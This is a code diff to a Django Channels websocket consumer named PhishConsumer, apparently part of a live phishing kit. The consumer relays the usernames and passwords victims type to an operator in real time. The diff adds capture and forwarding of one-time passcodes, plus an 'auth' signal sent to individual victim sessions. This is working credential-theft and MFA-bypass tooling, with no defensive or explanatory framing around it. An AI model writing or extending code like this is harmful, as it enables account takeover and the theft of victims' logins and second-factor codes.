@@ -37,7 +37,7 @@ class PhishConsumer(AsyncWebsocketConsumer):
         data = json.loads(text_data)
         session_id = self.scope["url_route"]["kwargs"]["session_id"]
         
-        if data['type'] == "username" or data['type'] == "password":
+        if data['type'] == "username" or data['type'] == "password" or data['type'] == "otp":
             data['session_id'] = session_id
             await self.channel_layer.group_send(
                 self.room_group_name, {"type":"value.change", "message" : data}
@@ -68,7 +68,17 @@ class PhishConsumer(AsyncWebsocketConsumer):
                 await self.channel_layer.group_send(
                 self.room_group_name, {"type":"valid", "session":data['session'], "msg" : response.json()}
                 )
+        
+        if data['type'] == "auth":
+            await self.channel_layer.group_send(
+                self.room_group_name, {"type":"auth", "session":data['session']}
+            )
 
+        if data['type'] == "otp_final":
+            data['session'] = session_id
+            await self.channel_layer.group_send(
+                self.room_group_name, {"type":"otp.message", "message":data}
+            )
 
     async def value_change(self, event):
         await self.send(text_data = json.dumps({"type":"vc","data":event['message']}))
@@ -78,6 +88,10 @@ class PhishConsumer(AsyncWebsocketConsumer):
 
     async def final_message(self, event):
         await self.send(text_data = json.dumps({"type": "final" , "data" : event['message']}))
+
+    async def otp_message(self, event):
+        await self.send(text_data = json.dumps({"type": "final_otp" , "data" : event['message']}))
+
 
     async def new_try(self, event):
         await self.send(text_data = json.dumps({"type": "try" , "data" : event['message']}))
@@ -89,5 +103,9 @@ class PhishConsumer(AsyncWebsocketConsumer):
     async def valid(self, event):
         if event['session'] == self.scope["url_route"]["kwargs"]["session_id"]:
             await self.send(text_data = json.dumps({"type": "valid" , "data" : event['msg']['redirect']}))
+    
+    async def auth(self, event):
+        if event['session'] == self.scope['url_route']['kwargs']['session_id']:
+            await self.send(text_data = json.dumps({"type":"auth"}))
 
     
